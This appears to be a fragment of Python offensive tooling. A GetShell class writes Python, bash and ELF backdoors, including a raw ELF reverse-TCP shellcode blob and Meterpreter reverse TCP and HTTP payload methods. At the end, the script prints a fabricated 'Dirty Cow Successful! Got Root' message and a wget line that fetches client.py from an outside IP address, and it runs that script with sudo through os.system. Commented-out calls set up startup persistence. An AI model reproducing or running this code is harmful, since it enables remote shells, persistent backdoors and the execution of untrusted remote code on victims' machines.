...
class GetShell:
    def __init__(self):
        ...
        self.backTypes = {"py":self.linux_python_BackdoorCreate, "sh":self.linux_bash_BackdoorCreate, "elf":self.linux_elf_BackdoorCreate}
        return
######################################################
######################################################
    def linux_python_BackdoorCreate(self, payload, scriptname):
...
######################################################
    def linux_elf_BackdoorCreate(self, payload, scriptname, auto=False):
        f = open(self.pwd + "/"+scriptname+".o", "wb")
        f.write(payload)
        f.close()
        if auto:
            pl = self.python_AutomateWrapper(scriptname+".o", timer=30)
            self.linux_python_BackdoorCreate(pl, scriptname)
            return pl
        else:
            self.linux_native_ScriptCreate(scriptname)
            return payload
######################################################
    def linux_bash_BackdoorCreate(self, payload, scriptname, auto=False):
        f = open(self.pwd + "/"+scriptname+".o", "wb")
        f.write(payload)
        f.close()
        if auto:
...
######################################################
    def linuxPyAuto_reverseTcp(self):       # Tested
        ...
        self.linux_elf_BackdoorCreate(i8192, "pyns", auto=True)   # Automated By Python Wrapper
######################################################
    def linuxNative_reverseTcp(self):
        i8192 = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00>\x00\x01\x00\x00\x00x\x00@\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x008\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\x00\x00@\x00\x00\x00\x00\x00\xf9\x00\x00\x00\x00\x00\x00\x00z\x01\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00\x00\x00\x00H1\xffj\tX\x99\xb6\x10H\x89\xd6M1\xc9j"AZ\xb2\x07\x0f\x05H\x85\xc0xRj\nAYVPj)X\x99j\x02_j\x01^\x0f\x05H\x85\xc0x;H\x97H\xb9\x02\x00 \x00\r\xe8\xc2oQH\x89\xe6j\x10Zj*X\x0f\x05YH\x85\xc0y%I\xff\xc9t\x18Wj#Xj\x00j\x05H\x89\xe7H1\xf6\x0f\x05YY_H\x85\xc0y\xc7j<Xj\x01_\x0f\x05^Z\x0f\x05H\x85\xc0x\xef\xff\xe6'
        self.linux_elf_BackdoorCreate(i8192, "pyns", auto=False)  # Pure Binary
######################################################
    def python_meterpreter_reverseTcp(self):    # Already Automated, Tested
        ...
        self.linux_python_BackdoorCreate(i8194, "pyn")
######################################################
    def python_meterpreter_reverseHttp(self):        # Tested
        ...
        self.linux_python_BackdoorCreate(i8197, "pynh")
######################################################
...
######################################################
######################################################
    def loadBackdoor(self, fname):
        f = open(fname, "rb")
        t = "py"   # Get Type of the backdoor
        s = f.read()
        return s  
######################################################
    def loadAndExec(self, fname, sname = None):
        s = self.loadBackdoor(fname)
        if not sname:
            sname = fname 
        t = fname.split("_")[1]
        self.backTypes[t](s, sname)
        return s   
######################################################
...
g = ExploitLoader()
print("Dirty Cow Successful! Got Root....\n")
print("[04/01/2019 06:06] root@ubuntu:~# wget https://13.232.194.111/client.py & python3 client.py")
import os 
os.system("sudo python3 client.py")
#g.executeExploit()
#s = GetShell();
#s.defaultBackdoors()
#s.set_onStartup();
